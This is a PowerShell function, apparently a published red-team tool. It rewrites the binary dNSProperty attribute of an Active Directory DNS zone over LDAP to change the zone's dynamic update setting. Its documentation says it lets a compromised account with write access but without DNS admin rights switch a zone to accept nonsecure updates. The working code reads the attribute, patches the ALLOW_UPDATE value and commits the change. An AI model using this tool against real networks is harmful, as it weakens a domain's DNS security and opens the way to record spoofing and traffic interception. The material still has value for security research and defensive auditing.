function Set-DNSZoneDynamicUpdate {
    <#
    .SYNOPSIS
        Modifies DNS Zone Dynamic Update setting via LDAP by directly editing the dNSProperty attribute.

    .DESCRIPTION
        This function changes the Dynamic Update configuration of an Active Directory-Integrated DNS Zone
        by modifying the DSPROPERTY_ZONE_ALLOW_UPDATE value in the dNSProperty binary attribute via LDAP.

        Unlike Set-DnsServerPrimaryZone, this does NOT require DNS Server management RPC access.
        It only requires GenericWrite, WriteProperty, or Full Control on the DNS zone AD object.

        This is useful for security research and red team operations where a compromised principal
        has write access to the zone object but is not a DNS admin.

        Zone object path:
        DC=<zone>,CN=MicrosoftDNS,DC=DomainDnsZones,DC=<domain>,DC=<tld>

        dNSProperty struct layout (MS-DNSP 2.3.2.1):
        - Bytes  0-3:  DataLength
        - Bytes  4-7:  NameLength (ignored, always 0x01)
        - Bytes  8-11: Flag (reserved, 0x00)
        - Bytes 12-15: Version (0x01)
        - Bytes 16-19: Id (property type)
        - Bytes 20+:   Data

        DSPROPERTY_ZONE_ALLOW_UPDATE Id = 0x00000002

        DNS_ZONE_UPDATE values (MS-DNSP 2.2.6.1.1):
        - 0 = ZONE_UPDATE_OFF        (None)
        - 1 = ZONE_UPDATE_UNSECURE   (Nonsecure and Secure)
        - 2 = ZONE_UPDATE_SECURE     (Secure Only)

    .PARAMETER ZoneName
        The DNS zone name (e.g., corp.local, dev.internal.local)

    .PARAMETER UpdateType
        Target dynamic update setting: None, NonsecureAndSecure, or SecureOnly

    .EXAMPLE
        Set-DNSZoneDynamicUpdate -ZoneName "corp.local" -UpdateType NonsecureAndSecure

        Changes the zone to accept nonsecure dynamic updates via LDAP.

    .EXAMPLE
        Set-DNSZoneDynamicUpdate -ZoneName "corp.local" -UpdateType SecureOnly

        Reverts the zone back to secure-only dynamic updates.

    .EXAMPLE
        Set-DNSZoneDynamicUpdate -ZoneName "corp.local" -UpdateType None

        Disables dynamic updates entirely.

    .NOTES
        Author  : Mustafa Nafiz Durukan
        License : MIT
        Ref     : MS-DNSP https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/

        The DNS Server service may need to reload the zone or be restarted for the change to take effect.

    .LINK
        https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/445c7843-e4a1-4222-8c0f-630c230a4c80
        https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/3af63871-0cc4-4179-916c-5caade55a8f3
        https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/d4b84209-f00c-478f-80d7-8dd0f1633d9e
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ZoneName,

        [Parameter(Mandatory = $true)]
        [ValidateSet("None", "NonsecureAndSecure", "SecureOnly")]
        [string]$UpdateType
    )

    $domainDN = ($ZoneName.Split('.') | ForEach-Object { "DC=$_" }) -join ','
    $zoneDN   = "DC=$ZoneName,CN=MicrosoftDNS,DC=DomainDnsZones,$domainDN"

    $updateMap = @{
        "None"                = [uint32]0
        "NonsecureAndSecure"  = [uint32]1
        "SecureOnly"          = [uint32]2
    }

    $targetValue = $updateMap[$UpdateType]

    Write-Host "[*] Zone DN: $zoneDN"
    Write-Host "[*] Target : $UpdateType ($targetValue)"

    try {
        $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$zoneDN")
        $props = $de.Properties["dNSProperty"]

        if ($props.Count -eq 0) {
            Write-Error "[-] dNSProperty attribute is empty or inaccessible."
            return $false
        }

        Write-Host "[*] dNSProperty value count: $($props.Count)"

        $found = $false
        for ($i = 0; $i -lt $props.Count; $i++) {
            $bytes = [byte[]]$props[$i]

            if ($bytes.Length -ge 24) {
                $propId = [BitConverter]::ToUInt32($bytes, 16)

                if ($propId -eq 0x00000002) {
                    $currentValue = [BitConverter]::ToUInt32($bytes, 20)
                    $currentName  = ($updateMap.GetEnumerator() | Where-Object { $_.Value -eq $currentValue }).Key

                    Write-Host "[*] Found ALLOW_UPDATE at index $i"
                    Write-Host "[*] Current: $currentName ($currentValue)"

                    if ($currentValue -eq $targetValue) {
                        Write-Host "[=] Already set to $UpdateType. No change needed."
                        return $true
                    }

                    $newBytes = [byte[]]$bytes.Clone()
                    [Array]::Copy([BitConverter]::GetBytes($targetValue), 0, $newBytes, 20, 4)
                    $props[$i] = $newBytes
                    $found = $true

                    Write-Host "[+] Modified: $currentName ($currentValue) -> $UpdateType ($targetValue)"
                    break
                }
            }
        }

        if (-not $found) {
            Write-Error "[-] ALLOW_UPDATE property not found in dNSProperty."
            return $false
        }

        $de.CommitChanges()
        Write-Host "[+] CommitChanges() successful!"
        Write-Host "[!] DNS Server may need to reload zone or restart for change to take effect."
        return $true

    } catch {
        Write-Error "[-] Error: $($_.Exception.Message)"
        return $false
    }
}
